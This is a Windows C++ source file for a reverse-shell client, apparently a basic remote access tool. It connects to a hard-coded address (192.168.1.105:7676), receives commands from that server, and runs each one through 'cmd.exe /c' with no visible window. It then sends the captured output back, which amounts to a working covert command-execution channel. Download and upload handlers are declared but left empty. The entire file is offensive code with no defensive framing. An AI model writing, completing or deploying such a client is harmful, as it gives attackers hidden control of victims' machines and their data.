#include <iostream>
#include <WinSock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#define RUNCMD 1
#define DOWNLOAD 2
#define UPLOAD 3
#define CLOSE 4
#pragma comment(lib, "Ws2_32.lib")

SOCKET connectServer(const char* serverAddr, const char* serverPort);
void messageHandler(SOCKET connectSocket);

int main()
{
    SOCKET connectSocket = connectServer("192.168.1.105", "7676");
    if (connectSocket != INVALID_SOCKET) {
        messageHandler(connectSocket);
    }
    else printf("Failed to connect");
    return 0;
}

SOCKET connectServer(const char* serverAddr, const char* serverPort) {
    WSADATA wsaData;
    ADDRINFO hints;
    memset(&hints, 0, sizeof(hints));
    ADDRINFO* result = NULL;
    SOCKET connectSocket = INVALID_SOCKET;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return INVALID_SOCKET;
    }

    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(serverAddr, serverPort, &hints, &result) != 0) {
        printf("getaddrinfo failed with error: %d\n", WSAGetLastError());
        WSACleanup();
        return INVALID_SOCKET;
    }

    connectSocket = WSASocketW(result->ai_family, result->ai_socktype, result->ai_protocol, NULL, 0, 0);
    if (connectSocket == INVALID_SOCKET) {
        freeaddrinfo(result);
        WSACleanup();
        return INVALID_SOCKET;
    }

    if (connect(connectSocket, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
        printf("Connect failed with error: %d\n", WSAGetLastError());
        closesocket(connectSocket);
        return INVALID_SOCKET;
    }
    return connectSocket;
}

void messageHandler(SOCKET connectSocket) {
    /*
    * Recv opCode and expectedSize (should be first 8 bytes)
    * Handle message depend on opCode
    * opCode: 1 RUNCMD, 2 DOWNLOAD, 3 UPLOAD, 4 CLOSE
    * Allocate and recv the message
    * Process message and send output to server (4b size + output)
    */
    int opCode = 0;
    int expectedSize = 0;
    char sizeBuffer[8];
    while (true) {
        if (recv(connectSocket, sizeBuffer, 8, 0) > 0) {
            memcpy(&opCode, sizeBuffer, sizeof(int));
            memcpy(&expectedSize, sizeBuffer + 4, sizeof(int));
        }
        switch (opCode) {
        case RUNCMD: {
            // RECV from Server
            wchar_t* cmdBuffer = (wchar_t*)malloc(expectedSize + sizeof(wchar_t));
            memset(cmdBuffer, 0, expectedSize + sizeof(wchar_t));
            int received = 0;
            while (received < expectedSize) {
                received += recv(connectSocket, (char*)(cmdBuffer) + received, expectedSize - received, 0);
            }
            wprintf(L"Command received: %ls\n", cmdBuffer);

            // RUNCMD and save output
            // Prepare full cmd to execute
            size_t fullCmdLen = wcslen(L"cmd.exe /c ") + (expectedSize / sizeof(wchar_t)) + 1;
            wchar_t* fullCmd = (wchar_t*)malloc(fullCmdLen * sizeof(wchar_t));
            swprintf(fullCmd, fullCmdLen, L"cmd.exe /c %ls", cmdBuffer);
            // Create a pipe so CreateProcess can read and write output to
            HANDLE hRead, hWrite;
            SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
            if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
                free(cmdBuffer); 
                free(fullCmd);
                break;
            }
            SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
            // Run the command, reading and saving the output
            STARTUPINFOW si;
            PROCESS_INFORMATION pi;
            memset(&si, 0, sizeof(si));
            si.cb = sizeof(si);
            si.hStdOutput = hWrite;
            si.hStdError = hWrite;
            si.dwFlags = STARTF_USESTDHANDLES;
            if (CreateProcessW(NULL, fullCmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                CloseHandle(hWrite);
                char tempBuf[1024];
                DWORD bytesRead;
                char* finalResult = NULL;
                int totalResultSize = 0;
                // Read from hRead and expand finalResult using realloc until ReadFile read all data
                while (ReadFile(hRead, tempBuf, sizeof(tempBuf), &bytesRead, NULL) && bytesRead > 0) {
                    char* newResult = (char*)realloc(finalResult, totalResultSize + bytesRead);
                    if (newResult) {
                        finalResult = newResult;
                        memcpy(finalResult + totalResultSize, tempBuf, bytesRead);
                        totalResultSize += bytesRead;
                    }
                }

            // SEND to server 4byte size + data
                send(connectSocket, (char*)&totalResultSize, sizeof(int), 0);
                if (totalResultSize > 0) {
                    send(connectSocket, finalResult, totalResultSize, 0);
                }
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                if (finalResult) free(finalResult);
            }

            CloseHandle(hRead);
            free(cmdBuffer);
            free(fullCmd);
            break;
        }
        case DOWNLOAD:
            break;
        case UPLOAD:
            break;
        case CLOSE:
            return;
        default:
            printf("opCode not sp");
        }
    }
}
